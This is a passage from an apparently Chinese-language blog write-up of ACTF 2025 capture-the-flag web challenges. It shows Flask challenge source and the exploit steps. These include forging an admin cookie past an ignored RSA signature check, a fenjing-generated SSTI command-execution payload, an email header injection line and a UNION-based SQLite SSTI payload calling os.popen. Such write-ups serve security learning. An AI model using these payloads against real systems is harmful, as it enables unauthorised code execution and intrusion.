    msg_hash <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>msg_str_bytes<span class="token punctuation">)</span>
    sig <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg_hash<span class="token punctuation">)</span>
    sig_hex <span class="token operator">=</span> sig<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    packed <span class="token operator">=</span> msg_str <span class="token operator">+</span> <span class="token string">"&amp;"</span> <span class="token operator">+</span> sig_hex
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>packed<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> validate_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        user_name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> user_name <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            users<span class="token punctuation">[</span>user_name<span class="token punctuation">]</span> <span class="token operator">=</span> APPUser<span class="token punctuation">(</span>
                name<span class="token operator">=</span>user_name<span class="token punctuation">,</span> password_raw<span class="token operator">=</span>password<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">"Registration successful! Please login."</span><span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">.</span>password_raw <span class="token operator">==</span> password<span class="token punctuation">:</span>
            resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">,</span> generate_cookie<span class="token punctuation">(</span>users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"Invalid credentials. Please try again."</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    valid<span class="token punctuation">,</span> current_username <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> valid <span class="token keyword">or</span> <span class="token keyword">not</span> current_username<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    user_profile <span class="token operator">=</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>current_username<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> current_username <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
            <span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
                <span class="token keyword">if</span> char <span class="token keyword">in</span> <span class="token string">"'_#&amp;;"</span><span class="token punctuation">:</span>
                    abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>

        html_template <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
&lt;!DOCTYPE html>
&lt;html lang="en">
&lt;head>
    &lt;meta charset="UTF-8">
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">
    &lt;title>Home&lt;/title>
    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    &lt;link rel="stylesheet" href="&#123;&#123; url_for('static', filename='styles.css') &#125;&#125;">
&lt;/head>
&lt;body>
    &lt;div class="container">
        &lt;h2 class="text-center">Welcome, %s !&lt;/h2>
        &lt;div class="text-center">
            Your payload: %s
        &lt;/div>
        &lt;img src="&#123;&#123; url_for('static', filename='interesting.jpeg') &#125;&#125;" alt="Embedded Image">
        &lt;div class="text-center">
            &lt;a href="/logout" class="btn btn-danger">Logout&lt;/a>
        &lt;/div>
    &lt;/div>
&lt;/body>
&lt;/html>
"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>
            current_username<span class="token punctuation">,</span>
            payload<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        html_template <span class="token operator">=</span> <span class="token punctuation">(</span>
            <span class="token triple-quoted-string string">"""
&lt;!DOCTYPE html>
&lt;html lang="en">
&lt;head>
    &lt;meta charset="UTF-8">
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">
    &lt;title>Home&lt;/title>
    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    &lt;link rel="stylesheet" href="&#123;&#123; url_for('static', filename='styles.css') &#125;&#125;">
&lt;/head>
&lt;body>
    &lt;div class="container">
        &lt;h2 class="text-center">server code (encoded)&lt;/h2>
        &lt;div class="text-center" style="word-break:break-all;">
        &#123;%% raw %%&#125;
            %s
        &#123;%% endraw %%&#125;
        &lt;/div>
        &lt;div class="text-center">
            &lt;a href="/logout" class="btn btn-danger">Logout&lt;/a>
        &lt;/div>
    &lt;/div>
&lt;/body>
&lt;/html>
"""</span>
            <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html_template<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>变成 RSA 了，直接看核心逻辑</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>cookie_b64<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie_b64<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie_b64<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        msg_str<span class="token punctuation">,</span> sig_hex <span class="token operator">=</span> cookie<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    msg_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>msg_str<span class="token punctuation">)</span>
    msg_str_bytes <span class="token operator">=</span> msg_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    msg_hash <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>msg_str_bytes<span class="token punctuation">)</span>
    sig <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>sig_hex<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>msg_hash<span class="token punctuation">,</span> sig<span class="token punctuation">)</span>
        valid <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        valid <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> valid<span class="token punctuation">,</span> msg_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user_name"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_cookie</span><span class="token punctuation">(</span>user<span class="token punctuation">:</span> APPUser<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    msg_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"user_name"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"login_time"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    msg_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>msg_dict<span class="token punctuation">)</span>
    msg_str_bytes <span class="token operator">=</span> msg_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    msg_hash <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>msg_str_bytes<span class="token punctuation">)</span>
    sig <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg_hash<span class="token punctuation">)</span>
    sig_hex <span class="token operator">=</span> sig<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    packed <span class="token operator">=</span> msg_str <span class="token operator">+</span> <span class="token string">"&amp;"</span> <span class="token operator">+</span> sig_hex
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>packed<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>并非 Bleichenbacher attack</p>
<p>我们只需要让 parse_cookie 返回 true 即可，那么核心就是这里的 <code>PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</code></p>
<p>cookie base64 解码大致如下：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span> <span class="token string">"admim"</span><span class="token punctuation">,</span> <span class="token property">"login_time"</span><span class="token operator">:</span> <span class="token number">1745753373</span><span class="token punctuation">&#125;</span>&amp;0b7a4475d332df30c7ce40c0f736c4d27cc658b164bce6f5d957c792d11279479836c6d35fb0eacb3fad7602adf6dfb20b05b3ce87fdb1ef62371a726ed62898170fa120e336d712ad1e526b8db192fae89476a79b8fc1664c68bf488c03a0aae6fef7b964f164423423ebdeaf172c2b5e5bb5e47f2b6e671bc24526715f04db7c9da426649474abcd9080d252b72127de62196bb5f4cf804403de65b2cab201d9bd6c89a42a3293224a8e1642108cd3d7649f9b23f4150c35fcc99f301da0bea27615f8f6371482548c61746acf9b6744884fbaf415c75c65725db913635d39ba97bcd4d0860c7bfa6103c65cd3248d29029584a456438ccf4948d56caa7301<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中 msg_hash 对应的是 &amp; 前的部分</p>
<p>观察 <code>PKCS1_v1_5.new</code> ，发现它只会返回 false 或者 true，但是并不会抛出错误，因为函数内部已经处理过了</p>
<p><img src="/blog/2025/04/26/ACTF-2025/image-20250427194213834.png" alt="image-20250427194213834"></p>
<p>那这个函数验证的结果不影响返回，也就是说直接改 cookie 的 name 为 admin 即可</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token property">"login_time"</span><span class="token operator">:</span> <span class="token number">1745753373</span><span class="token punctuation">&#125;</span>&amp;0b7a4475d332df30c7ce40c0f736c4d27cc658b164bce6f5d957c792d11279479836c6d35fb0eacb3fad7602adf6dfb20b05b3ce87fdb1ef62371a726ed62898170fa120e336d712ad1e526b8db192fae89476a79b8fc1664c68bf488c03a0aae6fef7b964f164423423ebdeaf172c2b5e5bb5e47f2b6e671bc24526715f04db7c9da426649474abcd9080d252b72127de62196bb5f4cf804403de65b2cab201d9bd6c89a42a3293224a8e1642108cd3d7649f9b23f4150c35fcc99f301da0bea27615f8f6371482548c61746acf9b6744884fbaf415c75c65725db913635d39ba97bcd4d0860c7bfa6103c65cd3248d29029584a456438ccf4948d56caa7301<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ssti 部分直接拿 fenjing 梭了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> fenjing <span class="token keyword">import</span> exec_cmd_payload<span class="token punctuation">,</span> config_payload
<span class="token keyword">import</span> logging

<span class="token keyword">import</span> urllib

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    shell_payload<span class="token punctuation">,</span> _ <span class="token operator">=</span> exec_cmd_payload<span class="token punctuation">(</span>waf<span class="token punctuation">,</span> <span class="token string">"grep -r 'ACTF&#123;'"</span><span class="token punctuation">)</span>
    <span class="token comment"># config_payload = config_payload(waf)</span>
    shell_payload <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>shell_payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>shell_payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token comment"># print(f"&#123;config_payload=&#125;")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/04/26/ACTF-2025/image-20250427213358398.png" alt="image-20250427213358398"></p>
<hr>
<h1 id="Excellent-Site（Unsolvd）"><a href="#Excellent-Site（Unsolvd）" class="headerlink" title="Excellent-Site（Unsolvd）"></a>Excellent-Site（Unsolvd）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/news"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">news</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    news_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> news_id<span class="token punctuation">:</span>
        news_id <span class="token operator">=</span> <span class="token number">1</span>

    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"news.db"</span><span class="token punctuation">)</span>
    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT title FROM news WHERE id = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>news_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> result<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Page not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>
    <span class="token keyword">return</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里一眼能 sqllite 注入，能拿 sqlmap 一把梭</p>
<p>目标是 &#x2F;admin 处打 ssti，admin 必须是本地</p>
<p>那么就要看 &#x2F;report</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    message <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>
        content <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
        smtplib<span class="token punctuation">.</span>_quote_periods <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x
        mail_content <span class="token operator">=</span> <span class="token triple-quoted-string string">"""From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n"""</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            server <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token string">"ezmail.org"</span><span class="token punctuation">)</span>
            mail_content <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>_fix_eols<span class="token punctuation">(</span>mail_content<span class="token punctuation">)</span>
            mail_content <span class="token operator">=</span> mail_content<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>
            server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span><span class="token string">"ignored@ezmail.org"</span><span class="token punctuation">,</span> <span class="token string">"admin@ezmail.org"</span><span class="token punctuation">,</span> mail_content<span class="token punctuation">)</span>
            message <span class="token operator">=</span> <span class="token string">"Submitted! Now wait till the end of the world."</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            message <span class="token operator">=</span> <span class="token string">"Send FAILED"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里可以注入邮件头</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>example<span class="token punctuation">.</span>com\r\nBcc<span class="token punctuation">:</span> duensm80437@chacuo<span class="token punctuation">.</span>net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试直接利用 sqlite 注入往数据库中写 ssti payload</p>
<p>但是这里不能堆叠注入，寄</p>
<p>直接让管理员写 ssti payload</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">-1+union+select+&#39;&#123;&#123;lipsum.__globals__.os.popen(&quot;sleep&quot;).read()&#125;&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
